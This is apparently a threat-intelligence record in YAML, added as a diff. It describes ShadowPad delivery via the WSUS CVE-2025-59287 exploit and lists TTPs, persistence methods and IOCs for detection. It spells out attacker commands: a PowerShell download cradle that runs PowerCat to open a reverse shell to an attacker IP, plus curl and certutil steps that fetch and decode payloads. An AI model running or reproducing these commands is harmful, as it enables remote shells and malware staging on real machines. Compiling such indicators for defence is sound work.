@@ -1,0 +1,78 @@
+description: ShadowPad was distributed via exploitation of the WSUS CVE-2025-59287
+  vulnerability using PowerCat and subsequent download of components with curl and
+  certutil.
+attribution: Chinese APT groups (state-backed)
+malware_families:
+- ShadowPad
+TTPs:
+  processes:
+  - powershell.exe
+  - cmd
+  - curl.exe
+  - certutil.exe
+  - ETDCtrlHelper.exe
+  - WinMail.exe
+  - wmpnetwk.exe
+  - wmplayer.exe
+  - svchost.exe
+  commandline:
+  - powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString (https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1);
+    powercat -c 154.17.26[.]41 -p 8080 -e cmd
+  - curl hxxp://149.28.78[.]189:42306/tmp.txt -o C:\\users\\%ASD%\\tmp.txt & curl
+    hxxp://149.28.78[.]189:42306/dll.txt -o C:\\users\\%ASD%\\dll.txt & curl hxxp://149.28.78[.]189:42306/exe.txt
+    -o C:\\users\\%ASD%\\exe.txt
+  - certutil -decode C:\\users\\%ASD%\\tmp.txt C:\\programdata\\0C137A80.tmp
+  powershell:
+  - IEX (New-Object System.Net.WebClient).DownloadString (https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1);
+    powercat -c 154.17.26[.]41 -p 8080 -e cmd
+  scripting_engine: []
+  registry_keys:
+  - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - process: powershell.exe
+    destination: 154.17.26[.]41
+    port: 8080
+  - process: curl.exe
+    destination: 149.28.78[.]189
+    port: 42306
+  - process: ETDCtrlHelper.exe
+    destination: 163.61.102[.]245
+    port: 443
+  file_activity:
+  - C:\\users\\%ASD%\\tmp.txt
+  - C:\\users\\%ASD%\\dll.txt
+  - C:\\users\\%ASD%\\exe.txt
+  - C:\\programdata\\0C137A80.tmp
+  - '%ProgramFiles%\\Q-X64\\Q-X64.exe'
+  - '%APPDATA%\\Q-X64\\Q-X64.exe'
+  - '%LOCALAPPDATA%\\Q-X64\\Q-X64.exe'
+  - '%TEMP%\\Q-X64\\Q-X64.exe'
+  persistence:
+  - 'Registry Run key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run with value
+    Q-X64'
+  - Task Scheduler path Microsoft\\Windows\\UPnP
+  - Startup processes in Program Files, AppData, LocalAppData, Temp directories
+  process_relations: []
+IOCs:
+  hashes:
+  - 27e00b5594530e8c5e004098eef2ec50
+  - 564e7d39a9b6da3cf0da3373351ac717
+  - 85b935e80e84dd47e0fa5e1dfb2c16f4
+  ips:
+  - 154.17.26[.]41
+  - 149.28.78[.]189
+  - 163.61.102[.]245
+  domains:
+  - raw.githubusercontent.com
+  - hxxp://149.28.78[.]189
+  - http://163.61.102[.]245
+  - https://163.61.102[.]245
+  urls:
+  - https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
+  - hxxp://149.28.78[.]189:42306/tmp.txt
+  - hxxp://149.28.78[.]189:42306/dll.txt
+  - hxxp://149.28.78[.]189:42306/exe.txt
+reference: https://asec.ahnlab.com/en/91166
+date_of_publication: November 18, 2025
+file_creation_date: November 29, 2025
